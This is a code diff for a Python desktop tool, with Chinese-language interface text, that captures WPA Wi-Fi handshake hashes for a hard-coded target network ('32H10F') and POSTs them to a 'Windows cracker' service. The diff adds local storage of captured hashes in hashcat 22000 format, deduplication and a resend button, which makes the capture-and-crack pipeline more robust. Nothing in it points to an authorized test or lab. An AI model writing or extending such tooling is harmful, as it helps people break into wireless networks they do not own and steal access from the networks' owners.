@@ -29,6 +29,10 @@ SERIAL_LOG  = '/tmp/vm_app_serial.log'
 MON_SOCK    = '/tmp/vm_app_monitor.sock'
 SSH_KEY     = os.path.expanduser('~/.ssh/vm_tongbao')
 
+# ---------- local offline hash store (on the Mac) ----------
+LOCAL_DIR   = os.path.expanduser('~/MacCapture/captures')
+LOCAL_HASH  = os.path.join(LOCAL_DIR, 'captures.22000')
+
 # ---------- defaults (32H10F) ----------
 DEFAULTS = {
     'ssid':       '32H10F',
@@ -75,13 +79,19 @@ class MacCaptureApp:
         r += 1
 
         self.btn = tk.Button(root, text='▶  開始抓包', command=self.start, font=('', 12, 'bold'))
-        self.btn.grid(row=r, column=0, columnspan=2, pady=10, padx=50)
+        self.btn.grid(row=r, column=0, sticky='e', pady=10, padx=12)
+        self.btn_resend = tk.Button(root, text='🔄 重送本機 hash', command=self.resend, font=('', 11, 'bold'))
+        self.btn_resend.grid(row=r, column=1, sticky='w', pady=10, padx=12)
 
         tk.Label(root, text='Log', font=('', 11, 'bold')).grid(
             row=r + 1, column=0, columnspan=2, sticky='w', padx=12)
         self.log = scrolledtext.ScrolledText(root, height=16, width=84)
         self.log.grid(row=r + 2, column=0, columnspan=2, padx=12, pady=8)
-        self.logline('就緒。確認 DWA-160 已插上 Mac，Windows cracker app 已開。')
+        self.logline('就緒。DWA-160 要插上 Mac；Windows cracker 沒開也行（hash 會存本機，之後按「重送」）。')
+        if os.path.exists(LOCAL_HASH):
+            with open(LOCAL_HASH) as _f:
+                _n = sum(1 for _line in _f if _line.strip())
+            self.logline('💾 本機已存 %d 個 hash（%s）' % (_n, LOCAL_HASH))
 
     # ---- helpers ----
     def logline(self, msg):
@@ -93,6 +103,67 @@ class MacCaptureApp:
             self.root.after(0, _append)
         except Exception:
             pass
+
+    def save_local(self, hash_lines):
+        """把抓到的 hash 存到 Mac 本機（去重 append）。離線能力核心。"""
+        try:
+            os.makedirs(LOCAL_DIR, exist_ok=True)
+            existing = set()
+            if os.path.exists(LOCAL_HASH):
+                with open(LOCAL_HASH) as f:
+                    existing = set(line.strip() for line in f if line.strip())
+            new = [h for h in hash_lines if h not in existing]
+            if new:
+                with open(LOCAL_HASH, 'a') as f:
+                    for h in new:
+                        f.write(h + '\n')
+            self.logline('   💾 本機已存 %d 個 hash（新增 %d）→ %s' % (
+                len(existing) + len(new), len(new), LOCAL_HASH))
+            return len(new)
+        except Exception as e:
+            self.logline('   ⚠️ 存本機失敗: %r' % e)
+            return 0
+
+    def post_hashes(self, hashes, ssid, bssid, wip, port):
+        """把 hash POST 給 Windows cracker。回傳成功數。第一個失敗就停（Windows 沒開）。"""
+        posted = 0
+        for i, h in enumerate(hashes):
+            payload = {'hash': h, 'ssid': ssid, 'bssid': bssid.lower()}
+            try:
+                req = urllib.request.Request(
+                    'http://%s:%s/api/receive-hash' % (wip, port),
+                    data=json.dumps(payload).encode(),
+                    headers={'Content-Type': 'application/json'}, method='POST')
+                resp = urllib.request.urlopen(req, timeout=15)
+                body = resp.read().decode('utf-8', 'replace')
+                self.logline('   POST OK: %s' % body[:120])
+                posted += 1
+            except Exception as e:
+                self.logline('   POST FAIL (hash %d/%d): %s' % (i + 1, len(hashes), e))
+                if i == 0:
+                    self.logline('   → Windows cracker 可能沒開。hash 已存本機，開起來後按「🔄 重送本機 hash」。')
+                    break
+        return posted
+
+    def resend(self):
+        """把 Mac 本機存的 hash 重新 POST 給 Windows（等 Windows 開起來後用）。"""
+        wip = self.var['windows_ip'].get().strip()
+        port = self.var['port'].get().strip()
+        ssid = self.var['ssid'].get().strip()
+        bssid = self.var['bssid'].get().strip().upper()
+        if not os.path.exists(LOCAL_HASH):
+            self.logline('📭 本機沒有存的 hash（%s 不存在）' % LOCAL_HASH)
+            return
+        with open(LOCAL_HASH) as f:
+            hashes = [line.strip() for line in f if line.strip()]
+        if not hashes:
+            self.logline('📭 本機 hash 檔是空的')
+            return
+        self.logline('🔄 重送 %d 個本機 hash 到 %s:%s ...' % (len(hashes), wip, port))
+        posted = self.post_hashes(hashes, ssid, bssid, wip, port)
+        self.logline('   重送完成 %d/%d。%s' % (
+            posted, len(hashes),
+            '' if posted == len(hashes) else '（沒送完的還在 Mac 本機，Windows 開起來再按重送）'))
 
     def start(self):
         self.btn.config(state='disabled')
@@ -202,22 +273,15 @@ class MacCaptureApp:
             for h in hash_lines:
                 self.logline('   HASH: %s' % (h[:64] + ('...' if len(h) > 64 else '')))
 
-            # 5. POST to Windows
+            # 4.5 存本機（離線能力：Windows 沒開也保得住）
+            if hash_lines:
+                self.save_local(hash_lines)
+            else:
+                self.logline('   💾 本次 0 hash（本機未新增）')
+
+            # 5. POST to Windows（順手；失敗不丟，本機已有）
             self.logline('[5/6] POST %d 個 hash 到 Windows %s:%s ...' % (len(hash_lines), wip, port))
-            posted = 0
-            for h in hash_lines:
-                payload = {'hash': h, 'ssid': ssid, 'bssid': bssid.lower()}
-                try:
-                    req = urllib.request.Request(
-                        'http://%s:%s/api/receive-hash' % (wip, port),
-                        data=json.dumps(payload).encode(),
-                        headers={'Content-Type': 'application/json'}, method='POST')
-                    resp = urllib.request.urlopen(req, timeout=15)
-                    body = resp.read().decode('utf-8', 'replace')
-                    self.logline('   POST OK: %s' % body[:120])
-                    posted += 1
-                except Exception as e:
-                    self.logline('   POST FAIL: %s' % e)
+            posted = self.post_hashes(hash_lines, ssid, bssid, wip, port) if hash_lines else 0
 
             # 6. result
             self.logline('[6/6] 完成。POST 成功 %d/%d。%s' % (
